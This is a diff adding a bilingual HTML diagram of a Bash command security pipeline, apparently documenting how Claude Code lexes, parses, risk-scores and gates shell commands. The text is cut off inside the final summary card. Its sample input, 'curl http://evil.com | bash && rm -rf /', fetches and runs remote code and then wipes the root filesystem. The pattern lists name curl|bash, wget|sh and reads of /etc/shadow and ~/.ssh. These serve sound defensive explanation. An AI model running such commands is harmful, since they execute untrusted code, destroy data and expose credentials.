@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark" data-lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VIS-3-018A | Bash AST解析管线全景图</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+    /* v2-fix-lang-priority · data-lang 优先 · lang fallback */
+    html[data-lang="en"] .lz { display: none !important; }
+    html[data-lang="zh"] .le { display: none !important; }
+    html:not([data-lang])[lang|="en"] .lz { display: none !important; }
+    html:not([data-lang]):not([lang|="en"]) .le { display: none !important; }
+:root,[data-theme="dark"]{--bg:#020617;--panel:#0f172a;--card:#1e293b;--border:#334155;--text:#f1f5f9;--muted:#94a3b8;--subtle:#475569;--amber:#fbbf24;--cyan:#22d3ee;--violet:#a78bfa;--emerald:#34d399;--rose:#fb7185;--slate:#94a3b8;--orange:#fb923c}
+[data-theme="warm"]{--bg:#1c1410;--panel:#2a1f16;--card:#3d2d20;--border:#5c4a3a;--text:#f5e6d3;--muted:#c4a882;--subtle:#8b7355;--amber:#fbbf24;--cyan:#22d3ee;--violet:#a78bfa;--emerald:#34d399;--rose:#fb7185;--slate:#94a3b8;--orange:#fb923c}
+[data-theme="light"]{--bg:#f8fafc;--panel:#f1f5f9;--card:#e2e8f0;--border:#cbd5e1;--text:#0f172a;--muted:#475569;--subtle:#94a3b8;--amber:#d97706;--cyan:#0891b2;--violet:#7c3aed;--emerald:#059669;--rose:#e11d48;--slate:#475569;--orange:#ea580c}
+
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:'JetBrains Mono',monospace;
+  background:var(--bg);
+  color:var(--text);
+  min-height:100vh;
+  padding:24px 20px 40px;
+}
+
+.ctrl{position:fixed;top:16px;right:16px;display:flex;gap:8px;z-index:100}
+.ctrl button{
+  font-family:'JetBrains Mono',monospace;
+  font-size:11px;padding:6px 12px;
+  background:var(--card);color:var(--text);
+  border:1px solid var(--border);border-radius:6px;cursor:pointer;
+  transition:background 0.15s;
+}
+.ctrl button:hover{background:var(--border)}[data-lang="en"] .lz{display:none}
+[data-lang="en"] .le{display:inline}
+
+/* Page layout */
+.page-header{
+  max-width:980px;margin:0 auto 20px;
+  border-bottom:1px solid var(--border);
+  padding-bottom:16px;
+}
+.page-id{font-size:11px;color:var(--subtle);letter-spacing:0.05em;margin-bottom:4px}
+.page-title{font-size:20px;font-weight:700;color:var(--text)}
+.page-sub{font-size:12px;color:var(--muted);margin-top:4px}
+
+.diagram-wrap{
+  max-width:980px;margin:0 auto;
+  background:var(--panel);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:20px;
+  overflow-x:auto;
+}
+
+/* Summary cards */
+.cards{
+  max-width:980px;margin:20px auto 0;
+  display:grid;grid-template-columns:repeat(3,1fr);gap:14px;
+}
+.card{
+  background:var(--panel);
+  border:1px solid var(--border);
+  border-radius:10px;padding:16px 18px;
+}
+.card-accent{display:block;width:28px;height:3px;border-radius:2px;margin-bottom:10px}
+.card-label{font-size:11px;color:var(--muted);letter-spacing:0.06em;text-transform:uppercase;margin-bottom:4px}
+.card-title{font-size:14px;font-weight:600;color:var(--text);margin-bottom:6px}
+.card-desc{font-size:11px;color:var(--muted);line-height:1.6}
+
+/* SVG tooltips */
+.stage-box{cursor:default}
+.stage-box:hover rect{filter:brightness(1.12)}
+
+@media(max-width:700px){
+  .cards{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<div class="ctrl">
+  <button onclick="cycleTheme()">🎨</button>
+  <button id="langBtn" onclick="toggleLang()">EN</button>
+</div>
+
+<div class="page-header">
+  <div class="page-id">VIS-3-018A · Bash Tool · Security Layer</div>
+  <div class="page-title">
+    <span class="lz">Bash AST 解析管线全景图</span>
+    <span class="le">Bash AST Parsing Pipeline Overview</span>
+  </div>
+  <div class="page-sub">
+    <span class="lz">Claude Code 在执行任何 Bash 命令前的完整安全扫描流程 · 输入 → 词法分析 → 语法树 → 风险评估 → 权限门控 → 执行/拦截</span>
+    <span class="le">Complete security scanning pipeline before Claude Code executes any Bash command · Input → Lex → AST → Risk → Gate → Execute/Block</span>
+  </div>
+</div>
+
+<div class="diagram-wrap">
+  <svg id="mainsvg" viewBox="0 0 940 540" xmlns="http://www.w3.org/2000/svg"
+       style="width:100%;height:auto;display:block">
+
+    <!-- Background grid (subtle) -->
+    <defs>
+      <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
+        <path d="M 40 0 L 0 0 0 40" fill="none" stroke="var(--border)" stroke-width="0.3" opacity="0.4"/>
+      </pattern>
+      <!-- Arrow marker: default -->
+      <marker id="arr" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
+        <polygon points="0 0, 8 3, 0 6" fill="var(--muted)"/>
+      </marker>
+      <!-- Arrow marker: danger (rose) -->
+      <marker id="arr-rose" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
+        <polygon points="0 0, 8 3, 0 6" fill="#fb7185"/>
+      </marker>
+      <!-- Arrow marker: safe (emerald) -->
+      <marker id="arr-emerald" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
+        <polygon points="0 0, 8 3, 0 6" fill="#34d399"/>
+      </marker>
+      <!-- Arrow marker: amber -->
+      <marker id="arr-amber" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
+        <polygon points="0 0, 8 3, 0 6" fill="#fbbf24"/>
+      </marker>
+      <!-- glow filter for critical elements -->
+      <filter id="glow-rose" x="-20%" y="-20%" width="140%" height="140%">
+        <feGaussianBlur in="SourceGraphic" stdDeviation="3" result="blur"/>
+        <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+      </filter>
+      <filter id="glow-emerald" x="-20%" y="-20%" width="140%" height="140%">
+        <feGaussianBlur in="SourceGraphic" stdDeviation="3" result="blur"/>
+        <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+      </filter>
+    </defs>
+
+    <rect width="940" height="540" fill="url(#grid)"/>
+
+    <!-- ═══════════════════════════════════════════════
+         SECTION A: Dangerous input example (top)
+         ═══════════════════════════════════════════════ -->
+
+    <!-- Label: Input Example -->
+    <text x="20" y="28" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--subtle)" letter-spacing="0.06em">
+      <tspan class="lz">危险命令示例 (输入)</tspan>
+      <tspan class="le">Dangerous Command Example (Input)</tspan>
+    </text>
+
+    <!-- Code block background -->
+    <rect x="20" y="34" width="900" height="34" rx="6" fill="var(--card)" stroke="var(--amber)" stroke-width="1.5"/>
+    <!-- Warning icon -->
+    <text x="34" y="56" font-family="JetBrains Mono,monospace" font-size="13" fill="var(--amber)">⚠</text>
+    <!-- Command text -->
+    <text x="55" y="56" font-family="JetBrains Mono,monospace" font-size="13" font-weight="600" fill="var(--amber)">
+      curl http://evil.com | bash &amp;&amp; rm -rf /
+    </text>
+    <!-- right annotation -->
+    <text x="820" y="56" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--rose)">
+      <tspan class="lz">← 高危命令串</tspan>
+      <tspan class="le">← critical chain</tspan>
+    </text>
+
+    <!-- ═══════════════════════════════════════════════
+         SECTION B: Pipeline stages (middle band)
+         Center Y of pipeline boxes = 200
+         ═══════════════════════════════════════════════ -->
+
+    <!-- Pipeline lane background -->
+    <rect x="10" y="86" width="920" height="170" rx="8" fill="var(--bg)" opacity="0.5"/>
+
+    <!-- ── STAGE 1: INPUT ── -->
+    <!-- Box: x=18, y=100, w=90, h=140 -->
+    <g class="stage-box">
+      <rect x="18" y="100" width="90" height="140" rx="8"
+            fill="var(--card)" stroke="var(--slate)" stroke-width="1.5"/>
+      <!-- Stage number badge -->
+      <rect x="18" y="100" width="90" height="28" rx="8" fill="var(--slate)" opacity="0.25"/>
+      <text x="63" y="119" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="600" fill="var(--slate)" letter-spacing="0.05em">
+        <tspan class="lz">① 输入</tspan>
+        <tspan class="le">① Input</tspan>
+      </text>
+      <!-- Content -->
+      <text x="63" y="147" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--slate)">
+        <tspan class="lz">原始命令</tspan>
+        <tspan class="le">Raw Cmd</tspan>
+      </text>
+      <text x="63" y="161" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--slate)">
+        <tspan class="lz">字符串</tspan>
+        <tspan class="le">String</tspan>
+      </text>
+      <!-- Icon: terminal -->
+      <text x="63" y="200" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="22" fill="var(--slate)">$_</text>
+      <text x="63" y="228" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--subtle)">bash string</text>
+    </g>
+
+    <!-- Arrow 1→2 -->
+    <line x1="110" y1="170" x2="132" y2="170" stroke="var(--muted)"
+          stroke-width="1.8" marker-end="url(#arr)"/>
+
+    <!-- ── STAGE 2: LEXER ── -->
+    <!-- Box: x=134, y=100, w=120, h=140 -->
+    <g class="stage-box">
+      <rect x="134" y="100" width="120" height="140" rx="8"
+            fill="var(--card)" stroke="var(--cyan)" stroke-width="1.5"/>
+      <rect x="134" y="100" width="120" height="28" rx="8" fill="var(--cyan)" opacity="0.2"/>
+      <text x="194" y="119" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="600" fill="var(--cyan)" letter-spacing="0.05em">
+        <tspan class="lz">② 词法分析器</tspan>
+        <tspan class="le">② Lexer</tspan>
+      </text>
+      <!-- Token chips -->
+      <rect x="142" y="135" width="36" height="15" rx="3" fill="var(--cyan)" opacity="0.15"/>
+      <text x="160" y="147" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--cyan)">curl</text>
+      <rect x="182" y="135" width="16" height="15" rx="3" fill="var(--cyan)" opacity="0.3"/>
+      <text x="190" y="147" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="700" fill="var(--cyan)">|</text>
+      <rect x="202" y="135" width="36" height="15" rx="3" fill="var(--cyan)" opacity="0.15"/>
+      <text x="220" y="147" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--cyan)">bash</text>
+
+      <rect x="142" y="154" width="20" height="15" rx="3" fill="var(--amber)" opacity="0.3"/>
+      <text x="152" y="166" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--amber)">&amp;&amp;</text>
+      <rect x="166" y="154" width="18" height="15" rx="3" fill="var(--rose)" opacity="0.2"/>
+      <text x="175" y="166" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)">rm</text>
+      <rect x="188" y="154" width="22" height="15" rx="3" fill="var(--rose)" opacity="0.2"/>
+      <text x="199" y="166" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)">-rf</text>
+      <rect x="214" y="154" width="14" height="15" rx="3" fill="var(--rose)" opacity="0.3"/>
+      <text x="221" y="166" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)">/</text>
+
+      <text x="194" y="186" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--muted)">
+        <tspan class="lz">识别: 命令/运算符/路径</tspan>
+        <tspan class="le">Identify: cmd/op/path</tspan>
+      </text>
+      <text x="194" y="200" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--muted)">
+        <tspan class="lz">标志/参数</tspan>
+        <tspan class="le">flags/args</tspan>
+      </text>
+      <text x="194" y="228" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--subtle)">Token[]</text>
+    </g>
+
+    <!-- Arrow 2→3 -->
+    <line x1="256" y1="170" x2="278" y2="170" stroke="var(--muted)"
+          stroke-width="1.8" marker-end="url(#arr)"/>
+
+    <!-- ── STAGE 3: PARSER / AST ── -->
+    <!-- Box: x=280, y=90, w=135, h=160 (taller for tree) -->
+    <g class="stage-box">
+      <rect x="280" y="90" width="135" height="160" rx="8"
+            fill="var(--card)" stroke="var(--violet)" stroke-width="1.5"/>
+      <rect x="280" y="90" width="135" height="28" rx="8" fill="var(--violet)" opacity="0.2"/>
+      <text x="347" y="109" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="600" fill="var(--violet)" letter-spacing="0.05em">
+        <tspan class="lz">③ 解析器 → AST</tspan>
+        <tspan class="le">③ Parser → AST</tspan>
+      </text>
+
+      <!-- AST tree visualization -->
+      <!-- Root: AndExpr -->
+      <rect x="303" y="125" width="68" height="18" rx="4" fill="var(--violet)" opacity="0.25"/>
+      <text x="337" y="137" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="600" fill="var(--violet)">AndExpr</text>
+
+      <!-- Branch lines from AndExpr -->
+      <line x1="315" y1="143" x2="307" y2="158" stroke="var(--violet)" stroke-width="1" opacity="0.6"/>
+      <line x1="359" y1="143" x2="367" y2="158" stroke="var(--violet)" stroke-width="1" opacity="0.6"/>
+
+      <!-- Left: PipeExpr -->
+      <rect x="285" y="158" width="58" height="16" rx="4" fill="var(--violet)" opacity="0.2"/>
+      <text x="314" y="170" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--violet)">PipeExpr</text>
+
+      <!-- PipeExpr children -->
+      <line x1="299" y1="174" x2="293" y2="187" stroke="var(--violet)" stroke-width="1" opacity="0.5"/>
+      <line x1="329" y1="174" x2="335" y2="187" stroke="var(--violet)" stroke-width="1" opacity="0.5"/>
+
+      <rect x="281" y="187" width="42" height="15" rx="3" fill="var(--cyan)" opacity="0.2"/>
+      <text x="302" y="198" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--cyan)">Cmd:curl</text>
+      <rect x="325" y="187" width="44" height="15" rx="3" fill="var(--rose)" opacity="0.25"/>
+      <text x="347" y="198" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)">Cmd:bash</text>
+
+      <!-- Right: Cmd:rm -rf / -->
+      <rect x="351" y="158" width="56" height="16" rx="4" fill="var(--rose)" opacity="0.25"/>
+      <text x="379" y="170" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)">Cmd:rm</text>
+      <text x="379" y="182" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)">-rf /</text>
+
+      <!-- Danger badges -->
+      <text x="347" y="213" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)">⚠ pipe:bash</text>
+      <text x="379" y="213" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)">⚠ -rf /</text>
+
+      <text x="347" y="240" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--subtle)">AST Node tree</text>
+    </g>
+
+    <!-- Arrow 3→4 -->
+    <line x1="417" y1="170" x2="441" y2="170" stroke="var(--muted)"
+          stroke-width="1.8" marker-end="url(#arr)"/>
+
+    <!-- ── STAGE 4: AST ANALYZER ── -->
+    <!-- Box: x=443, y=100, w=130, h=140 -->
+    <g class="stage-box">
+      <rect x="443" y="100" width="130" height="140" rx="8"
+            fill="var(--card)" stroke="var(--amber)" stroke-width="1.5"/>
+      <rect x="443" y="100" width="130" height="28" rx="8" fill="var(--amber)" opacity="0.18"/>
+      <text x="508" y="119" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="600" fill="var(--amber)" letter-spacing="0.05em">
+        <tspan class="lz">④ AST 分析器</tspan>
+        <tspan class="le">④ AST Analyzer</tspan>
+      </text>
+
+      <!-- Check list -->
+      <text x="453" y="141" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--rose)">✕ curl | bash</text>
+      <text x="453" y="155" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--rose)">✕ wget | sh</text>
+      <text x="453" y="169" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--rose)">✕ rm -rf /</text>
+      <text x="453" y="183" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--rose)">✕ chmod 777</text>
+      <text x="453" y="197" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--amber)">~ /etc/passwd</text>
+      <text x="453" y="211" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--amber)">~ ~/.ssh/keys</text>
+      <text x="508" y="232" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--subtle)">
+        <tspan class="lz">遍历 AST 节点</tspan>
+        <tspan class="le">Walk AST nodes</tspan>
+      </text>
+    </g>
+
+    <!-- Arrow 4→5 -->
+    <line x1="575" y1="170" x2="599" y2="170" stroke="var(--muted)"
+          stroke-width="1.8" marker-end="url(#arr)"/>
+
+    <!-- ── STAGE 5: RISK SCORER ── -->
+    <!-- Box: x=601, y=100, w=120, h=140 -->
+    <g class="stage-box">
+      <rect x="601" y="100" width="120" height="140" rx="8"
+            fill="var(--card)" stroke="var(--orange)" stroke-width="1.5"/>
+      <rect x="601" y="100" width="120" height="28" rx="8" fill="var(--orange)" opacity="0.2"/>
+      <text x="661" y="119" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="600" fill="var(--orange)" letter-spacing="0.05em">
+        <tspan class="lz">⑤ 风险评分</tspan>
+        <tspan class="le">⑤ Risk Scorer</tspan>
+      </text>
+
+      <!-- Risk levels stack -->
+      <rect x="611" y="132" width="100" height="15" rx="3" fill="var(--rose)" opacity="0.3"/>
+      <text x="661" y="143" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="600" fill="var(--rose)">CRITICAL</text>
+      <rect x="611" y="151" width="100" height="15" rx="3" fill="var(--orange)" opacity="0.3"/>
+      <text x="661" y="162" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--orange)">DANGEROUS</text>
+      <rect x="611" y="170" width="100" height="15" rx="3" fill="var(--amber)" opacity="0.3"/>
+      <text x="661" y="181" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--amber)">WARNING</text>
+      <rect x="611" y="189" width="100" height="15" rx="3" fill="var(--emerald)" opacity="0.25"/>
+      <text x="661" y="200" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--emerald)">SAFE</text>
+
+      <!-- Current verdict pointer -->
+      <polygon points="609,137 603,140 609,143" fill="var(--rose)"/>
+
+      <text x="661" y="228" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--subtle)">
+        <tspan class="lz">聚合评分</tspan>
+        <tspan class="le">Aggregate score</tspan>
+      </text>
+    </g>
+
+    <!-- Arrow 5→6 (diamond) -->
+    <line x1="723" y1="170" x2="747" y2="170" stroke="var(--muted)"
+          stroke-width="1.8" marker-end="url(#arr)"/>
+
+    <!-- ── STAGE 6: PERMISSION GATE (diamond) ── -->
+    <!-- Diamond center: cx=800, cy=170, half-w=58, half-h=50 -->
+    <g class="stage-box">
+      <!-- Diamond shape -->
+      <polygon points="800,120 858,170 800,220 742,170"
+               fill="var(--card)" stroke="var(--rose)" stroke-width="2"/>
+      <!-- Inner glow ring -->
+      <polygon points="800,128 850,170 800,212 750,170"
+               fill="none" stroke="var(--rose)" stroke-width="0.5" opacity="0.4"/>
+
+      <text x="800" y="157" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" font-weight="700" fill="var(--rose)" letter-spacing="0.03em">
+        <tspan class="lz">⑥ 权限门控</tspan>
+        <tspan class="le">⑥ Perm Gate</tspan>
+      </text>
+      <text x="800" y="170" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)" opacity="0.9">PERMISSION</text>
+      <text x="800" y="182" text-anchor="middle" font-family="JetBrains Mono,monospace"
+            font-size="10" fill="var(--rose)" opacity="0.9">GATE</text>
+    </g>
+
+    <!-- ═══════════════════════════════════════════════
+         STAGE 7: Two branches from Permission Gate
+         ═══════════════════════════════════════════════ -->
+
+    <!-- BRANCH A: BLOCK (top branch → rose, upward) -->
+    <!-- Arrow from top of diamond (800,120) going up then right to block box -->
+    <path d="M 800,120 L 800,64" stroke="var(--rose)" stroke-width="2"
+          stroke-dasharray="5,3" marker-end="url(#arr-rose)" fill="none"/>
+    <!-- Block box: x=840, y=44, w=90, h=40 -->
+    <rect x="840" y="44" width="90" height="40" rx="8"
+          fill="var(--card)" stroke="var(--rose)" stroke-width="2" filter="url(#glow-rose)"/>
+    <text x="885" y="61" text-anchor="middle" font-family="JetBrains Mono,monospace"
+          font-size="11" font-weight="700" fill="var(--rose)">⑦b BLOCK</text>
+    <text x="885" y="76" text-anchor="middle" font-family="JetBrains Mono,monospace"
+          font-size="10" fill="var(--rose)">
+      <tspan class="lz">exit 2 拦截</tspan>
+      <tspan class="le">exit 2 denied</tspan>
+    </text>
+    <!-- Label on branch: CRITICAL -->
+    <text x="816" y="93" font-family="JetBrains Mono,monospace" font-size="10"
+          fill="var(--rose)">CRITICAL</text>
+
+    <!-- Horizontal connector from top of diamond to block box -->
+    <path d="M 800,64 L 840,64" stroke="var(--rose)" stroke-width="2"
+          stroke-dasharray="5,3" fill="none"/>
+
+    <!-- BRANCH B: EXECUTE (right branch → emerald) -->
+    <!-- Arrow from right of diamond (858,170) going right -->
+    <line x1="858" y1="170" x2="882" y2="170" stroke="var(--emerald)"
+          stroke-width="2" marker-end="url(#arr-emerald)"/>
+    <!-- Execute box: x=884, y=145, w=46, h=50 -->
+    <rect x="884" y="145" width="48" height="50" rx="8"
+          fill="var(--card)" stroke="var(--emerald)" stroke-width="2" filter="url(#glow-emerald)"/>
+    <text x="908" y="162" text-anchor="middle" font-family="JetBrains Mono,monospace"
+          font-size="10" font-weight="700" fill="var(--emerald)">⑦a</text>
+    <text x="908" y="175" text-anchor="middle" font-family="JetBrains Mono,monospace"
+          font-size="10" font-weight="700" fill="var(--emerald)">RUN</text>
+    <text x="908" y="187" text-anchor="middle" font-family="JetBrains Mono,monospace"
+          font-size="10" fill="var(--emerald)">SAFE</text>
+    <!-- Label: SAFE -->
+    <text x="862" y="163" font-family="JetBrains Mono,monospace" font-size="10"
+          fill="var(--emerald)">SAFE</text>
+
+    <!-- ═══════════════════════════════════════════════
+         SECTION C: Permission Gate Decision Table
+         (below the pipeline band)
+         ═══════════════════════════════════════════════ -->
+
+    <!-- Decision table header -->
+    <text x="20" y="278" font-family="JetBrains Mono,monospace" font-size="10"
+          fill="var(--subtle)" letter-spacing="0.06em">
+      <tspan class="lz">权限门控决策矩阵</tspan>
+      <tspan class="le">Permission Gate Decision Matrix</tspan>
+    </text>
+
+    <!-- Table rows: 4 risk levels -->
+    <!-- Row 1: CRITICAL -->
+    <rect x="20" y="284" width="900" height="32" rx="6" fill="var(--rose)" opacity="0.08"/>
+    <rect x="20" y="284" width="4" height="32" rx="2" fill="var(--rose)"/>
+    <text x="36" y="304" font-family="JetBrains Mono,monospace" font-size="11" font-weight="700" fill="var(--rose)">CRITICAL</text>
+    <text x="155" y="304" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--muted)">
+      <tspan class="lz">curl|bash · wget|sh · /bin/sh 远程执行链</tspan>
+      <tspan class="le">curl|bash · wget|sh · /bin/sh remote exec chain</tspan>
+    </text>
+    <text x="640" y="304" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--rose)" font-weight="600">
+      <tspan class="lz">→ 直接拦截 (exit 2)，不询问用户</tspan>
+      <tspan class="le">→ Block immediately (exit 2), no prompt</tspan>
+    </text>
+
+    <!-- Row 2: DANGEROUS -->
+    <rect x="20" y="320" width="900" height="32" rx="6" fill="var(--orange)" opacity="0.07"/>
+    <rect x="20" y="320" width="4" height="32" rx="2" fill="var(--orange)"/>
+    <text x="36" y="340" font-family="JetBrains Mono,monospace" font-size="11" font-weight="600" fill="var(--orange)">DANGEROUS</text>
+    <text x="155" y="340" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--muted)">
+      <tspan class="lz">rm -rf · chmod 777 · 写入系统文件 · sudo</tspan>
+      <tspan class="le">rm -rf · chmod 777 · write system files · sudo</tspan>
+    </text>
+    <text x="640" y="340" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--orange)" font-weight="600">
+      <tspan class="lz">→ 弹出明确确认对话框</tspan>
+      <tspan class="le">→ Require explicit user confirmation</tspan>
+    </text>
+
+    <!-- Row 3: WARNING -->
+    <rect x="20" y="356" width="900" height="32" rx="6" fill="var(--amber)" opacity="0.07"/>
+    <rect x="20" y="356" width="4" height="32" rx="2" fill="var(--amber)"/>
+    <text x="36" y="376" font-family="JetBrains Mono,monospace" font-size="11" font-weight="600" fill="var(--amber)">WARNING</text>
+    <text x="155" y="376" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--muted)">
+      <tspan class="lz">/etc/passwd · ~/.ssh · 环境变量修改 · history</tspan>
+      <tspan class="le">/etc/passwd · ~/.ssh · env modification · history</tspan>
+    </text>
+    <text x="640" y="376" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--amber)" font-weight="600">
+      <tspan class="lz">→ 黄色警告提示 (可继续)</tspan>
+      <tspan class="le">→ Yellow warning prompt (can proceed)</tspan>
+    </text>
+
+    <!-- Row 4: SAFE -->
+    <rect x="20" y="392" width="900" height="32" rx="6" fill="var(--emerald)" opacity="0.06"/>
+    <rect x="20" y="392" width="4" height="32" rx="2" fill="var(--emerald)"/>
+    <text x="36" y="412" font-family="JetBrains Mono,monospace" font-size="11" font-weight="600" fill="var(--emerald)">SAFE</text>
+    <text x="155" y="412" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--muted)">
+      <tspan class="lz">ls · cat · grep · pwd · echo · 只读命令</tspan>
+      <tspan class="le">ls · cat · grep · pwd · echo · read-only commands</tspan>
+    </text>
+    <text x="640" y="412" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--emerald)" font-weight="600">
+      <tspan class="lz">→ 自动批准，直接执行</tspan>
+      <tspan class="le">→ Auto-approve, execute directly</tspan>
+    </text>
+
+    <!-- ═══════════════════════════════════════════════
+         SECTION D: FAIL-CLOSED Principle
+         ═══════════════════════════════════════════════ -->
+    <rect x="20" y="434" width="900" height="42" rx="8"
+          fill="var(--card)" stroke="var(--rose)" stroke-width="1.5" stroke-dasharray="6,3"/>
+    <!-- Fail closed icon -->
+    <text x="38" y="460" font-family="JetBrains Mono,monospace" font-size="14" fill="var(--rose)">🔒</text>
+    <text x="58" y="452" font-family="JetBrains Mono,monospace" font-size="11" font-weight="700" fill="var(--rose)">
+      <tspan class="lz">FAIL-CLOSED 原则</tspan>
+      <tspan class="le">FAIL-CLOSED Principle</tspan>
+    </text>
+    <text x="58" y="468" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--muted)">
+      <tspan class="lz">AST 解析失败 / 词法错误 / 未知模式 → 默认拒绝执行，绝不放行未经检验的命令</tspan>
+      <tspan class="le">Parse failure / lex error / unknown pattern → default deny; never execute unverified commands</tspan>
+    </text>
+
+    <!-- ═══════════════════════════════════════════════
+         AST Node type legend (right side of pipeline)
+         ═══════════════════════════════════════════════ -->
+    <!-- Legend box at bottom right inside pipeline area -->
+    <rect x="600" y="256" width="320" height="18" rx="4" fill="none"/>
+    <text x="600" y="268" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--subtle)" letter-spacing="0.04em">
+      <tspan class="lz">AST 节点类型: </tspan>
+      <tspan class="le">AST Node types: </tspan>
+      <tspan fill="var(--violet)">Command · Pipe · And · Or · </tspan>
+      <tspan fill="var(--amber)">Redirect · Subshell · VarAssign</tspan>
+    </text>
+
+    <!-- Stage numbers / pipeline flow label -->
+    <text x="460" y="268" font-family="JetBrains Mono,monospace" font-size="10" fill="var(--subtle)">
+      <tspan class="lz">管线流向 →</tspan>
+      <tspan class="le">pipeline flow →</tspan>
+    </text>
+
+  </svg>
+</div>
+
+<!-- Summary Cards -->
+<div class="cards">
+  <div class="card">
+    <span class="card-accent" style="background:var(--cyan)"></span>
+    <div class="card-label">
+      <span class="lz">词法 + 语法</span>
+      <span class="le">Lex + Parse</span>
+    </div>
+    <div class="card-title">
+      <span class="lz">AST 解析</span>
+      <span class="le">AST Parsing</span>
+    </div>
+    <div class="card-desc">
+      <span class="lz">命令字符串经过词法分析器切分为 Token 序列，再由解析器构建出完整的抽象语法树（AST），捕获命令、管道、逻辑运算符等结构关系。</span>
+      <span class="le">Command strings are tokenized by the Lexer, then built into a full Abstract Syntax Tree by the Parser, capturing commands, pipes, logical operators and their structural relationships.</span>
+    </div>
+  </div>
+  <div class="card">
+    <span class="card-accent" style="background:var(--amber)"></span>
+    <div class="card-label">
+      <span class="lz">危险模式</span>
+      <span class="le">Danger Patterns</span>
+    </div>
+    <div class="card-title">
+      <span class="lz">模式检测</span>
+      <span class="le">Pattern Detection</span>
+    </div>
+    <div class="card-desc">
+      <span class="lz">分析器遍历 AST 节点，检查危险组合：<code>curl|bash</code>、<code>rm -rf /</code>、<code>chmod 777</code>、敏感路径访问 (<code>/etc/shadow</code>、<code>~/.ssh</code>) 等已知攻击模式。</span>
+      <span class="le">Analyzer walks AST nodes checking for dangerous combinations: <code>curl|bash</code>, <code>rm -rf /</code>, <code>chmod 777</code>, sensitive path access (<code>/etc/shadow</code>, <code>~/.ssh</code>) and known attack patterns.</span>
+    </div>
+  </div>
+  <div class="card">
+    <span class="card-accent" style="background:var(--rose)"></span>
+    <div class="card-label">
+      <span class="lz">安全默认值</span>
+      <span class="le">Secure Default</span>
+    </div>
+    <div class="card-title">
